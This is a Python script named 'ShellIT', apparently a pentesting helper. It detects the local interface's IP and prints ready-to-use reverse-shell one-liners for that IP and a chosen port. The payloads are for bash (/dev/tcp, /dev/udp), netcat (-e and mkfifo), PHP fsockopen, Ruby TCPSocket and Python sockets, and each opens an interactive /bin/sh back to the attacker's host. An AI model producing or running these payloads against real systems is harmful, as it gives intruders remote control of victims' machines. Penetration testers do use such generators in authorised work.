#!/usr/bin/env python3
import netifaces as ifcs
import argparse



banner = print("""\
 ____  _          _ _ ___ _____ 
/ ___|| |__   ___| | |_ _|_   _|
\___ \| '_ \ / _ \ | || |  | |  
 ___) | | | |  __/ | || |  | |  
|____/|_| |_|\___|_|_|___| |_|  
                              
by Jon Helmus

type -h for usage information!\n\n
""")



commands = { 
    "bash": (''' 
 ____    _    ____  _   _ 
| __ )  / \  / ___|| | | |
|  _ \ / _ \ \___ \| |_| |
| |_) / ___ \ ___) |  _  |
|____/_/   \_\____/|_| |_|
''', "bash -i >& /dev/tcp/{}/{} 0>&1", "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'", "/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'", "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196", "sh -i >& /dev/udp/{}/{} 0>&1"),
    "nc": (''' 
 _   _  ____ 
| \ | |/ ___|
|  \| | |    
| |\  | |___ 
|_| \_|\____|
''',"nc -e /bin/sh {} {}", "rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc {} {} >/tmp/ff",),
    "php": ('''
 ____  _   _ ____  
|  _ \| | | |  _ \ 
| |_) | |_| | |_) |
|  __/|  _  |  __/ 
|_|   |_| |_|_|    
                 ''',"php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",),
    "ruby": (''' 
 ____        _           
|  _ \ _   _| |__  _   _ 
| |_) | | | | '_ \| | | |
|  _ <| |_| | |_) | |_| |
|_| \_\\__,_|_.__/ \__, |
                   |___/ 
''',"ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", ),
    "python": (''' 
 ____        _   _                 
|  _ \ _   _| |_| |__   ___  _ __  
| |_) | | | | __| '_ \ / _ \| '_ \ 
|  __/| |_| | |_| | | | (_) | | | |
|_|    \__, |\__|_| |_|\___/|_| |_|
       |___/                       
''',"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
}

def get_args():
    p = argparse.ArgumentParser(description="Raining Shells!")
    p.add_argument("iface", type=str, default=None, nargs="?", help="the network interface to use")
    p.add_argument("-p", "--port", type=int, default=4444, dest="port", help="port number. Defaults to 4444 when not specified")
    p.add_argument("-c", "--choose", nargs="+", dest="choose", help="which command would you like to use? ")
    return p

def get_Inner_Face():
    ifaces = ifcs.interfaces()
    for i in ifaces:
        addr = ifcs.ifaddresses(i)
        if (i == "lo") or (ifcs.AF_INET not in addr):
            continue        
        return i, ifcs.ifaddresses(i)[ifcs.AF_INET][0]["addr"]
    return None, None

def get_iface(prefer):
    ifaces = ifcs.interfaces()
    if prefer not in ifaces:
        return get_Inner_Face() 

    addr = ifcs.ifaddresses(prefer)
    if ifcs.AF_INET not in addr:
        return get_Inner_Face()    
    return prefer, ifcs.ifaddresses(prefer)[ifcs.AF_INET][0]["addr"]

if __name__ == "__main__":
    ins = get_args().parse_args()
    iface, ip = get_iface(ins.iface)
    if iface is None:
        print("ERROR: there are no intercaces to choose from")
        exit(1)

    if ins.choose is None:
        [print(cmd.format(ip, ins.port)) for _, v in commands.items() for cmd in v]
    else:
        [print(cmd.format(ip, ins.port)) for c in ins.choose if c in commands for cmd in commands[c]]
